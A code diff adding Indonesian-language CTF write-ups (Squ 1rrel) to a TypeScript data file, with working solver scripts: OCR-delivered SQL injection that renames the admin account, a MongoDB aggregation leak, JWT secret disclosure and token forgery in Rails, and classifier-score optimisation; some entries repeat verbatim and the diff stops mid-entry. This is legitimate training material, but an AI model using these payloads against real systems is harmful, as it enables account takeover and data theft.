@@ -1,6 +1,6 @@
 import type { WriteUp } from '../types';
 
-// Squ1rrel CTF — 10 writeups
+// Squ 1rrel — 18 writeups
 export const squ1rrelCtfWriteups: WriteUp[] = [
   {
     "id": "squ1rrel-misc-loremipsum",
@@ -467,6 +467,336 @@ export const squ1rrelCtfWriteups: WriteUp[] = [
     ],
     "terminalOutputs": [],
     "flag": "squ1rrel{tree_shaking?_nah_we_dont_do_that_here}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "squ1rrel-misc-soulmate",
+    "title": "- misc/soulmate",
+    "category": "Misc",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Squ 1rrel",
+    "tags": [],
+    "description": "Challenge ini kelihatan seperti web app AI biasa, tapi inti bug-nya ada di **design API**.",
+    "problemDescription": "Challenge ini kelihatan seperti web app AI biasa, tapi inti bug-nya ada di **design API**.",
+    "tools": [],
+    "analysis": "Saya mulai dengan baca source utama:\n- `backend/app.py`\n- `models/inference.py`\n- frontend JS untuk melihat endpoint yang dipanggil.\n\nEndpoint penting:\n- `GET /generate-random` -> generate wajah dari seed tanggal lahir\n- `POST /submit-u` -> menerima vektor kontrol `u` (dimensi PCA), lalu:\n  1. `u` di-clip ke batas bawah/atas\n  2. diubah ke latent `w`\n  3. digenerate jadi image\n  4. diskor classifier selebriti\n  5. kalau `tom_score >= 0.15`, server mengembalikan `flag`",
+    "solution": [
+      {
+        "title": "2) Akar masalah",
+        "content": "`/submit-u` membuka akses langsung ke ruang kontrol latent (`u`) **dan mengembalikan nilai objektif** (`tom_score`) setiap request.\n\nArtinya, endpoint ini jadi **oracle optimasi**. Kita tidak perlu ngerti model internal, cukup lakukan black-box optimization untuk memaksimalkan `tom_score` sampai melewati threshold.\n\nTambahan petunjuk dari artefak challenge:\n- ada file `checkpoints/pca_basis_d8_tom_weighted.npz`\n- ini mengindikasikan basis PCA memang sudah dibentuk agar arah tertentu lebih condong ke kelas Tom Cruise.\n\nJadi eksploit realistisnya: cari `u` yang mendorong score >= threshold."
+      },
+      {
+        "title": "3) Eksploitasi",
+        "content": "Saya buat solver otomatis `solve.py`:\n- query `GET /health` untuk ambil:\n  - `control_dim`\n  - `u_lower`, `u_upper`\n  - `tom_score_threshold`\n- inisialisasi `u` di tengah batas\n- lakukan random local search + restart global:\n  - sampling kandidat di sekitar best saat ini\n  - clip ke range valid\n  - kirim ke `/submit-u`\n  - pakai `tom_score` sebagai feedback\n- stop ketika response `success=true` dan `flag` muncul\n\nPendekatan ini murni black-box dan stabil untuk service yang ngasih score per request."
+      },
+      {
+        "title": "4) Hasil pada instance lokal",
+        "content": "Pada environment lokal challenge ini, flag tersedia sebagai:\n\n`squ1rrel{test_flag}`"
+      },
+      {
+        "title": "5) Catatan keamanan",
+        "content": "Fix yang benar (kombinasi):\n- jangan expose endpoint latent-control mentah ke user publik,\n- jangan kembalikan score kontinu yang bisa dipakai sebagai oracle,\n- rate limit + anomaly detection untuk query optimasi,\n- verifikasi challenge condition di sisi internal yang tidak bisa di-query berulang secara bebas."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport random\r\nimport sys\r\nfrom typing import List, Tuple\r\n\r\nimport requests\r\n\r\n\r\ndef clip_vec(v: List[float], lo: List[float], hi: List[float]) -> List[float]:\r\n    return [max(lo[i], min(hi[i], float(v[i]))) for i in range(len(v))]\r\n\r\n\r\ndef score(url: str, u: List[float], timeout: float = 30.0) -> Tuple[float, bool, str]:\r\n    r = requests.post(\r\n        f\"{url}/submit-u\",\r\n        json={\"u\": u, \"include_image\": False},\r\n        timeout=timeout,\r\n    )\r\n    r.raise_for_status()\r\n    data = r.json()\r\n    return float(data.get(\"tom_score\", 0.0)), bool(data.get(\"success\", False)), str(data.get(\"flag\", \"\"))\r\n\r\n\r\ndef main() -> int:\r\n    ap = argparse.ArgumentParser(description=\"Soulmate solver\")\r\n    ap.add_argument(\"url\", help=\"Base URL target, ex: http://127.0.0.1:8000\")\r\n    ap.add_argument(\"--iters\", type=int, default=2000)\r\n    ap.add_argument(\"--seed\", type=int, default=1337)\r\n    ap.add_argument(\"--sigma\", type=float, default=0.35)\r\n    ap.add_argument(\"--batch\", type=int, default=40)\r\n    args = ap.parse_args()\r\n\r\n    random.seed(args.seed)\r\n    url = args.url.rstrip(\"/\")\r\n\r\n    h = requests.get(f\"{url}/health\", timeout=20).json()\r\n    d = int(h[\"control_dim\"])\r\n    lo = list(map(float, h[\"u_lower\"]))\r\n    hi = list(map(float, h[\"u_upper\"]))\r\n    threshold = float(h[\"tom_score_threshold\"])\r\n\r\n    # Start from center of bounds\r\n    cur = [(lo[i] + hi[i]) * 0.5 for i in range(d)]\r\n    cur_s, cur_ok, cur_flag = score(url, cur)\r\n    print(f\"[*] init tom_score={cur_s:.6f} threshold={threshold:.6f}\")\r\n    if cur_ok and cur_flag:\r\n        print(cur_flag)\r\n        return 0\r\n\r\n    best = cur[:]\r\n    best_s = cur_s\r\n\r\n    for it in range(1, args.iters + 1):\r\n        improved = False\r\n\r\n        # local random search around current best\r\n        for _ in range(args.batch):\r\n            cand = [best[i] + random.gauss(0.0, args.sigma) * (hi[i] - lo[i]) for i in range(d)]\r\n            cand = clip_vec(cand, lo, hi)\r\n            s, ok, flag = score(url, cand)\r\n            if ok and flag:\r\n                print(flag)\r\n                return 0\r\n            if s > best_s:\r\n                best_s = s\r\n                best = cand\r\n                improved = True\r\n\r\n        if improved:\r\n            cur = best[:]\r\n        else:\r\n            # occasional global restart to avoid local optima\r\n            cur = [random.uniform(lo[i], hi[i]) for i in range(d)]\r\n            s, ok, flag = score(url, cur)\r\n            if ok and flag:\r\n                print(flag)\r\n                return 0\r\n            if s > best_s:\r\n                best_s = s\r\n                best = cur[:]\r\n\r\n        if it % 20 == 0:\r\n            print(f\"[*] iter={it} best_tom={best_s:.6f}\")\r\n\r\n    print(f\"[!] not solved yet, best_tom={best_s:.6f} (< {threshold:.6f})\", file=sys.stderr)\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "squ1rrel{test_flag}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "squ1rrel-web-hackersboted",
+    "title": "- hackersBOTted (web/misc)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Squ 1rrel",
+    "tags": [],
+    "description": "Challenge ini punya flow:\n- Upload foto ke `/api/spot`\n- Backend pakai Google Vision OCR/label/face untuk ekstrak teks\n- Tiap hasil deteksi dicek lewat fungsi `isAdmin(name)`",
+    "problemDescription": "Challenge ini punya flow:\n- Upload foto ke `/api/spot`\n- Backend pakai Google Vision OCR/label/face untuk ekstrak teks\n- Tiap hasil deteksi dicek lewat fungsi `isAdmin(name)`\n\nMasalah utamanya ada di query SQL pada `backend/db.js`:\n\n```js\nconst query = `SELECT role FROM users WHERE name = '${cleaned}'`;\n```\n\nInput `name` tidak diparameterisasi. Sanitasi yang ada cuma hapus `--`, `/*`, `*/`, jadi masih bisa SQL injection pakai statement lain.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Ide Eksploitasi",
+        "content": "Karena `name` berasal dari OCR hasil gambar, payload SQL ditulis sebagai teks di dalam gambar lalu di-upload.\n\nTujuan exploit:\n1. Bypass pengecekan admin supaya request lanjut.\n2. Ubah username admin aktif (yang terus berotasi) jadi nilai yang kita tahu, misalnya `ownedadmin`.\n3. Panggil `/api/flag` dengan username itu.\n\nPayload yang dipakai:\n\n\n\nKenapa ini jalan:\n- `UNION SELECT 'user'` bikin baris pertama result punya role `user`, jadi fungsi `isAdmin` menganggap bukan admin.\n- `UPDATE users SET name='ownedadmin' WHERE role='admin'` mengganti nama admin acak saat ini ke `ownedadmin`.\n- Setelah itu, endpoint `/api/flag` menerima `ownedadmin` sebagai admin valid dan ngasih flag.",
+        "code": "x' UNION SELECT 'user'; UPDATE users SET name='ownedadmin' WHERE role='admin'; SELECT 'user"
+      },
+      {
+        "title": "Solver",
+        "content": "File solver: `solve.py`\n\nJalankan:\n\n\n\nAtau pakai URL custom:\n\n\n\nScript akan:\n- generate gambar payload secara otomatis (Pillow)\n- kirim ke `/api/spot`\n- request `/api/flag` dengan username hasil takeover\n- print flag",
+        "code": "source /home/nata/ctf_env/bin/activate\npython solve.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport io\r\nimport re\r\nimport sys\r\nimport time\r\n\r\nimport requests\r\nfrom PIL import Image, ImageDraw, ImageFont\r\n\r\nBASE_URL = \"http://hackersbotted.squ1rrel.dev\"\r\nADMIN_MARKER = \"ownedadmin\"\r\n\r\n\r\ndef build_payload_image(payload: str) -> bytes:\r\n    img = Image.new(\"RGB\", (3600, 260), \"white\")\r\n    draw = ImageDraw.Draw(img)\r\n\r\n    font_paths = [\r\n        \"/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf\",\r\n        \"/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf\",\r\n    ]\r\n    font = None\r\n    for fp in font_paths:\r\n        try:\r\n            font = ImageFont.truetype(fp, 58)\r\n            break\r\n        except OSError:\r\n            continue\r\n    if font is None:\r\n        font = ImageFont.load_default()\r\n\r\n    draw.text((20, 80), payload, fill=\"black\", font=font)\r\n    buf = io.BytesIO()\r\n    img.save(buf, format=\"PNG\")\r\n    return buf.getvalue()\r\n\r\n\r\ndef exploit(base_url: str) -> str:\r\n    session = requests.Session()\r\n\r\n    payload = (\r\n        \"x' UNION SELECT 'user'; \"\r\n        f\"UPDATE users SET name='{ADMIN_MARKER}' WHERE role='admin'; \"\r\n        \"SELECT 'user\"\r\n    )\r\n    image_bytes = build_payload_image(payload)\r\n\r\n    files = {\"photo\": (\"payload.png\", image_bytes, \"image/png\")}\r\n    data = {\"spotter\": \"alice\"}\r\n\r\n    # Trigger SQLi through OCR text in /api/spot\r\n    session.post(f\"{base_url}/api/spot\", files=files, data=data, timeout=20)\r\n\r\n    # Brief delay to avoid rate-limit edge and ensure update committed.\r\n    time.sleep(1.2)\r\n\r\n    r = session.post(\r\n        f\"{base_url}/api/flag\",\r\n        json={\"username\": ADMIN_MARKER},\r\n        timeout=20,\r\n    )\r\n    r.raise_for_status()\r\n    j = r.json()\r\n    if \"flag\" not in j:\r\n        raise RuntimeError(f\"Flag not found in response: {j}\")\r\n    return j[\"flag\"]\r\n\r\n\r\ndef main() -> None:\r\n    base = sys.argv[1] if len(sys.argv) > 1 else BASE_URL\r\n    flag = exploit(base)\r\n\r\n    if not re.match(r\"^[A-Za-z0-9_{}\\-]+$\", flag):\r\n        print(flag)\r\n        return\r\n\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "squ1rrel{g3t_sp0773d_b0z0_l0l}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "squ1rrel-web-mongolia",
+    "title": "- web/mongolia",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Squ 1rrel",
+    "tags": [],
+    "description": "Writeup for challenge - web/mongolia",
+    "problemDescription": "Challenge ini kasih web yang bisa:\n1. `POST /api/connect` untuk connect ke MongoDB remote dengan credential internal.\n2. `GET /api/journals` untuk baca jurnal non-secret.\n3. `POST /api/query` untuk jalankan aggregation pipeline user.\n\nData `secret:true` berisi `journal = FLAG` yang diulang 20x.\nServer mencoba nyensor flag pakai `stripFlag()`, tapi hanya ke **value**, bukan **nama key object**.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Vulnerability",
+        "content": "Di `index.js` ada fungsi:\n\n- `stripFlag(obj)`\n- Kalau `obj` string -> replace `FLAG` jadi `[REDACTED]`\n- Kalau `obj` object -> loop `for (const [k, v] of Object.entries(obj)) out[k] = stripFlag(v)`\n\nMasalahnya: `k` (nama field) tidak pernah disanitasi.\n\nEndpoint `POST /api/query` masih mengizinkan stage `$group`, dan operator `$arrayToObject` tidak masuk blacklist regex.\nArtinya kita bisa bikin object dinamis dengan key dari field `$journal` (yang berisi flag)."
+      },
+      {
+        "title": "Payload Exploit",
+        "content": "Pipeline yang dipakai:\n\n\n\nHasilnya kurang lebih:\n\n\n\nKarena flag ada di **key** object, `stripFlag()` tidak redaksi.\nLalu tinggal regex ambil token pertama `squ1rrel{...}`.",
+        "code": "[\n  {\"$match\": {\"secret\": true}},\n  {\"$limit\": 1},\n  {\n    \"$group\": {\n      \"_id\": {\n        \"$arrayToObject\": [[{\"k\": \"$journal\", \"v\": 1}]]\n      }\n    }\n  }\n]"
+      },
+      {
+        "title": "Solver",
+        "content": "File solver sudah disimpan di:\n- `solver.py`\n\nJalankan:\n\n\n\nOutput:",
+        "code": "source /home/nata/ctf_env/bin/activate\ncd /home/nata/ctf/squ1rrel/web/mongolia/dist\npython3 solver.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport json\r\nimport sys\r\nimport requests\r\n\r\nBASE_URL = \"https://mongolia.squ1rrel.dev\"\r\nMONGO_TARGET = \"136.112.223.118:5051/mongolia\"\r\n\r\n\r\ndef connect_session():\r\n    resp = requests.post(\r\n        f\"{BASE_URL}/api/connect\",\r\n        json={\"url\": MONGO_TARGET},\r\n        timeout=20,\r\n    )\r\n    resp.raise_for_status()\r\n    data = resp.json()\r\n    token = data.get(\"token\")\r\n    if not token:\r\n        raise RuntimeError(f\"No token in response: {data}\")\r\n    return token\r\n\r\n\r\ndef query_leak(token: str):\r\n    # Leak trick: put $journal as object key via $arrayToObject.\r\n    # stripFlag() only sanitizes values, not object keys.\r\n    pipeline = [\r\n        {\"$match\": {\"secret\": True}},\r\n        {\"$limit\": 1},\r\n        {\r\n            \"$group\": {\r\n                \"_id\": {\r\n                    \"$arrayToObject\": [\r\n                        [\r\n                            {\r\n                                \"k\": \"$journal\",\r\n                                \"v\": 1,\r\n                            }\r\n                        ]\r\n                    ]\r\n                }\r\n            }\r\n        },\r\n    ]\r\n\r\n    resp = requests.post(\r\n        f\"{BASE_URL}/api/query\",\r\n        headers={\"x-session-token\": token, \"content-type\": \"application/json\"},\r\n        json={\"pipeline\": json.dumps(pipeline)},\r\n        timeout=30,\r\n    )\r\n    resp.raise_for_status()\r\n    data = resp.json()\r\n    if not isinstance(data, list) or not data:\r\n        raise RuntimeError(f\"Unexpected query response: {data}\")\r\n    leaked_obj = data[0].get(\"_id\", {})\r\n    if not isinstance(leaked_obj, dict) or not leaked_obj:\r\n        raise RuntimeError(f\"Leak failed, _id not object: {data[0]}\")\r\n\r\n    # Key contains flag repeated many times.\r\n    leaked_key = next(iter(leaked_obj.keys()))\r\n    return leaked_key\r\n\r\n\r\ndef extract_flag(text: str):\r\n    m = re.search(r\"squ1rrel\\{[^}]+\\}\", text)\r\n    if not m:\r\n        raise RuntimeError(\"Flag pattern not found in leaked content\")\r\n    return m.group(0)\r\n\r\n\r\ndef main():\r\n    token = connect_session()\r\n    leaked_text = query_leak(token)\r\n    flag = extract_flag(leaked_text)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except Exception as exc:\r\n        print(f\"[!] {exc}\", file=sys.stderr)\r\n        sys.exit(1)"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "squ1rrel{3rli4nh0tu4h_zin4li?}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "squ1rrel-web-rails",
+    "title": "- web/rails",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Squ 1rrel",
+    "tags": [],
+    "description": "Writeup for challenge - web/rails",
+    "problemDescription": "Challenge ini punya dua bug yang kalau digabung jadi full chain:\n1. **Unsafe constantize** di endpoint `/show/:resource`.\n2. **Auth JWT lemah** di middleware admin (cukup valid signature, tanpa validasi claim).\n\nTerus ada bug kecil lagi di controller admin:\n- Filter blokir `id == \"1\"` bisa dibypass pakai input seperti `01`, tapi query DB tetap resolve ke row `id=1`.\n\nKombinasi tiga hal itu langsung ngasih flag.",
+    "tools": [],
+    "analysis": "Endpoint yang hidup dan menarik:\n- `GET /up` -> health check.\n- `GET /admin` -> `401 Missing Admin Authentication Cookie`.\n- `GET /show/:resource` -> endpoint dinamis.\n\nDari source challenge:\n- `ShowController#index` membentuk nama class dari user input:\n  - `resource_name = @resource + \"Module\"`\n  - `resource_name.constantize.new.show`\n- Ada class `JWTModule < JWTSecret`.\n- `JWTSecret#show` return secret JWT (ENV `JWT_SECRET` atau random saat boot).\n\nArtinya `/show/JWT` akan memanggil `JWTModule#show` yang mewarisi method dari `JWTSecret` dan membocorkan signing key.",
+    "solution": [
+      {
+        "title": "1) Secret Disclosure via constantize",
+        "content": "`/show/JWT` mengembalikan secret signing JWT aplikasi."
+      },
+      {
+        "title": "2) Weak JWT Validation di `/admin`",
+        "content": "Middleware `AdminAuth` hanya melakukan:\n- Ambil cookie `auth`\n- `JWT.decode(token, hmac_secret, true, { algorithm: 'HS256' })`\n\nTidak ada cek role/admin claim sama sekali. Jadi asal token ditandatangani dengan secret yang benar, request dianggap lolos."
+      },
+      {
+        "title": "3) ID Guard Bypass",
+        "content": "Di `Admin::PostsController#index`:\n- Jika `id == \"1\"` -> raise error.\n- Lalu query: `Post.where(id: params[:id]).first`\n\nInput `01` tidak sama dengan string literal `\"1\"`, jadi guard tidak aktif. Tapi DB tetap menafsirkan nilai itu sebagai id 1, sehingga post terlarang tetap terbaca."
+      },
+      {
+        "title": "Langkah Eksploitasi",
+        "content": "1. Leak secret:\n   - Request `GET /show/JWT`\n2. Forge JWT HS256 dengan secret tadi:\n   - payload bebas (misal `{ \"user\": \"admin\" }`)\n3. Akses endpoint admin dengan cookie `auth=<token>`\n4. Bypass guard id:\n   - `GET /admin/posts?id=01`\n5. Ambil `data.content` -> flag."
+      },
+      {
+        "title": "Solver",
+        "content": "File solver sudah disimpan di:\n- `solver.py`\n\nCara pakai:\n\n\nOpsional target custom:",
+        "code": "source /home/nata/ctf_env/bin/activate\ncd /home/nata/ctf/squ1rrel/web/rails/rails-ctf-dist\npython3 solver.py"
+      },
+      {
+        "title": "Catatan Hardening",
+        "content": "Kalau ini aplikasi beneran, perbaikannya:\n- Jangan pakai `constantize` dari input user.\n- Jangan expose class sensitif melalui endpoint generik.\n- JWT admin wajib validasi claim (`role == admin`, `exp`, `aud`, dll).\n- Hindari guard berbasis string literal untuk ID, gunakan check yang konsisten dengan tipe data."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport sys\r\nimport requests\r\nimport jwt\r\n\r\nBASE_URL = \"https://rails.squ1rrel.dev\"\r\nTIMEOUT = 10\r\n\r\n\r\ndef get_jwt_secret(base_url: str) -> str:\r\n    r = requests.get(f\"{base_url}/show/JWT\", timeout=TIMEOUT)\r\n    r.raise_for_status()\r\n    data = r.json()\r\n    secret = data.get(\"data\")\r\n    if not secret:\r\n        raise RuntimeError(\"JWT secret tidak ditemukan dari /show/JWT\")\r\n    return secret\r\n\r\n\r\ndef forge_token(secret: str) -> str:\r\n    payload = {\"user\": \"admin\"}\r\n    return jwt.encode(payload, secret, algorithm=\"HS256\")\r\n\r\n\r\ndef get_flag(base_url: str, token: str) -> str:\r\n    # Bypass guard id == \"1\" dengan varian numerik yang tetap match ke row id=1 di DB\r\n    params = {\"id\": \"01\"}\r\n    cookies = {\"auth\": token}\r\n    r = requests.get(f\"{base_url}/admin/posts\", params=params, cookies=cookies, timeout=TIMEOUT)\r\n    r.raise_for_status()\r\n\r\n    j = r.json()\r\n    content = (((j or {}).get(\"data\") or {}).get(\"content\"))\r\n    if not content:\r\n        raise RuntimeError(\"Konten post tidak ditemukan\")\r\n    return content\r\n\r\n\r\ndef main():\r\n    base = BASE_URL\r\n    if len(sys.argv) > 1:\r\n        base = sys.argv[1].rstrip(\"/\")\r\n\r\n    secret = get_jwt_secret(base)\r\n    token = forge_token(secret)\r\n    flag = get_flag(base, token)\r\n\r\n    print(\"[+] JWT Secret:\", secret)\r\n    print(\"[+] Forged Token:\", token)\r\n    print(\"[+] Flag:\", flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "squ1rrel{rails?_in_my_ctf???}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "squ1rrel-misc-soulmate-challenge",
+    "title": "- misc/soulmate",
+    "category": "Misc",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Squ 1rrel",
+    "tags": [],
+    "description": "Challenge ini kelihatan seperti web app AI biasa, tapi inti bug-nya ada di **design API**.",
+    "problemDescription": "Challenge ini kelihatan seperti web app AI biasa, tapi inti bug-nya ada di **design API**.",
+    "tools": [],
+    "analysis": "Saya mulai dengan baca source utama:\n- `backend/app.py`\n- `models/inference.py`\n- frontend JS untuk melihat endpoint yang dipanggil.\n\nEndpoint penting:\n- `GET /generate-random` -> generate wajah dari seed tanggal lahir\n- `POST /submit-u` -> menerima vektor kontrol `u` (dimensi PCA), lalu:\n  1. `u` di-clip ke batas bawah/atas\n  2. diubah ke latent `w`\n  3. digenerate jadi image\n  4. diskor classifier selebriti\n  5. kalau `tom_score >= 0.15`, server mengembalikan `flag`",
+    "solution": [
+      {
+        "title": "2) Akar masalah",
+        "content": "`/submit-u` membuka akses langsung ke ruang kontrol latent (`u`) **dan mengembalikan nilai objektif** (`tom_score`) setiap request.\n\nArtinya, endpoint ini jadi **oracle optimasi**. Kita tidak perlu ngerti model internal, cukup lakukan black-box optimization untuk memaksimalkan `tom_score` sampai melewati threshold.\n\nTambahan petunjuk dari artefak challenge:\n- ada file `checkpoints/pca_basis_d8_tom_weighted.npz`\n- ini mengindikasikan basis PCA memang sudah dibentuk agar arah tertentu lebih condong ke kelas Tom Cruise.\n\nJadi eksploit realistisnya: cari `u` yang mendorong score >= threshold."
+      },
+      {
+        "title": "3) Eksploitasi",
+        "content": "Saya buat solver otomatis `solve.py`:\n- query `GET /health` untuk ambil:\n  - `control_dim`\n  - `u_lower`, `u_upper`\n  - `tom_score_threshold`\n- inisialisasi `u` di tengah batas\n- lakukan random local search + restart global:\n  - sampling kandidat di sekitar best saat ini\n  - clip ke range valid\n  - kirim ke `/submit-u`\n  - pakai `tom_score` sebagai feedback\n- stop ketika response `success=true` dan `flag` muncul\n\nPendekatan ini murni black-box dan stabil untuk service yang ngasih score per request."
+      },
+      {
+        "title": "4) Hasil pada instance lokal",
+        "content": "Pada environment lokal challenge ini, flag tersedia sebagai:\n\n`squ1rrel{test_flag}`"
+      },
+      {
+        "title": "5) Catatan keamanan",
+        "content": "Fix yang benar (kombinasi):\n- jangan expose endpoint latent-control mentah ke user publik,\n- jangan kembalikan score kontinu yang bisa dipakai sebagai oracle,\n- rate limit + anomaly detection untuk query optimasi,\n- verifikasi challenge condition di sisi internal yang tidak bisa di-query berulang secara bebas."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport random\r\nimport sys\r\nfrom typing import List, Tuple\r\n\r\nimport requests\r\n\r\n\r\ndef clip_vec(v: List[float], lo: List[float], hi: List[float]) -> List[float]:\r\n    return [max(lo[i], min(hi[i], float(v[i]))) for i in range(len(v))]\r\n\r\n\r\ndef score(url: str, u: List[float], timeout: float = 30.0) -> Tuple[float, bool, str]:\r\n    r = requests.post(\r\n        f\"{url}/submit-u\",\r\n        json={\"u\": u, \"include_image\": False},\r\n        timeout=timeout,\r\n    )\r\n    r.raise_for_status()\r\n    data = r.json()\r\n    return float(data.get(\"tom_score\", 0.0)), bool(data.get(\"success\", False)), str(data.get(\"flag\", \"\"))\r\n\r\n\r\ndef main() -> int:\r\n    ap = argparse.ArgumentParser(description=\"Soulmate solver\")\r\n    ap.add_argument(\"url\", help=\"Base URL target, ex: http://127.0.0.1:8000\")\r\n    ap.add_argument(\"--iters\", type=int, default=2000)\r\n    ap.add_argument(\"--seed\", type=int, default=1337)\r\n    ap.add_argument(\"--sigma\", type=float, default=0.35)\r\n    ap.add_argument(\"--batch\", type=int, default=40)\r\n    args = ap.parse_args()\r\n\r\n    random.seed(args.seed)\r\n    url = args.url.rstrip(\"/\")\r\n\r\n    h = requests.get(f\"{url}/health\", timeout=20).json()\r\n    d = int(h[\"control_dim\"])\r\n    lo = list(map(float, h[\"u_lower\"]))\r\n    hi = list(map(float, h[\"u_upper\"]))\r\n    threshold = float(h[\"tom_score_threshold\"])\r\n\r\n    # Start from center of bounds\r\n    cur = [(lo[i] + hi[i]) * 0.5 for i in range(d)]\r\n    cur_s, cur_ok, cur_flag = score(url, cur)\r\n    print(f\"[*] init tom_score={cur_s:.6f} threshold={threshold:.6f}\")\r\n    if cur_ok and cur_flag:\r\n        print(cur_flag)\r\n        return 0\r\n\r\n    best = cur[:]\r\n    best_s = cur_s\r\n\r\n    for it in range(1, args.iters + 1):\r\n        improved = False\r\n\r\n        # local random search around current best\r\n        for _ in range(args.batch):\r\n            cand = [best[i] + random.gauss(0.0, args.sigma) * (hi[i] - lo[i]) for i in range(d)]\r\n            cand = clip_vec(cand, lo, hi)\r\n            s, ok, flag = score(url, cand)\r\n            if ok and flag:\r\n                print(flag)\r\n                return 0\r\n            if s > best_s:\r\n                best_s = s\r\n                best = cand\r\n                improved = True\r\n\r\n        if improved:\r\n            cur = best[:]\r\n        else:\r\n            # occasional global restart to avoid local optima\r\n            cur = [random.uniform(lo[i], hi[i]) for i in range(d)]\r\n            s, ok, flag = score(url, cur)\r\n            if ok and flag:\r\n                print(flag)\r\n                return 0\r\n            if s > best_s:\r\n                best_s = s\r\n                best = cur[:]\r\n\r\n        if it % 20 == 0:\r\n            print(f\"[*] iter={it} best_tom={best_s:.6f}\")\r\n\r\n    print(f\"[!] not solved yet, best_tom={best_s:.6f} (< {threshold:.6f})\", file=sys.stderr)\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "squ1rrel{test_flag}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "squ1rrel-web-hackersboted-dist",
+    "title": "- hackersBOTted (web/misc)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Squ 1rrel",
+    "tags": [],
+    "description": "Challenge ini punya flow:\n- Upload foto ke `/api/spot`\n- Backend pakai Google Vision OCR/label/face untuk ekstrak teks\n- Tiap hasil deteksi dicek lewat fungsi `isAdmin(name)`",
+    "problemDescription": "Challenge ini punya flow:\n- Upload foto ke `/api/spot`\n- Backend pakai Google Vision OCR/label/face untuk ekstrak teks\n- Tiap hasil deteksi dicek lewat fungsi `isAdmin(name)`\n\nMasalah utamanya ada di query SQL pada `backend/db.js`:\n\n```js\nconst query = `SELECT role FROM users WHERE name = '${cleaned}'`;\n```\n\nInput `name` tidak diparameterisasi. Sanitasi yang ada cuma hapus `--`, `/*`, `*/`, jadi masih bisa SQL injection pakai statement lain.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Ide Eksploitasi",
+        "content": "Karena `name` berasal dari OCR hasil gambar, payload SQL ditulis sebagai teks di dalam gambar lalu di-upload.\n\nTujuan exploit:\n1. Bypass pengecekan admin supaya request lanjut.\n2. Ubah username admin aktif (yang terus berotasi) jadi nilai yang kita tahu, misalnya `ownedadmin`.\n3. Panggil `/api/flag` dengan username itu.\n\nPayload yang dipakai:\n\n\n\nKenapa ini jalan:\n- `UNION SELECT 'user'` bikin baris pertama result punya role `user`, jadi fungsi `isAdmin` menganggap bukan admin.\n- `UPDATE users SET name='ownedadmin' WHERE role='admin'` mengganti nama admin acak saat ini ke `ownedadmin`.\n- Setelah itu, endpoint `/api/flag` menerima `ownedadmin` sebagai admin valid dan ngasih flag.",
+        "code": "x' UNION SELECT 'user'; UPDATE users SET name='ownedadmin' WHERE role='admin'; SELECT 'user"
+      },
+      {
+        "title": "Solver",
+        "content": "File solver: `solve.py`\n\nJalankan:\n\n\n\nAtau pakai URL custom:\n\n\n\nScript akan:\n- generate gambar payload secara otomatis (Pillow)\n- kirim ke `/api/spot`\n- request `/api/flag` dengan username hasil takeover\n- print flag",
+        "code": "source /home/nata/ctf_env/bin/activate\npython solve.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
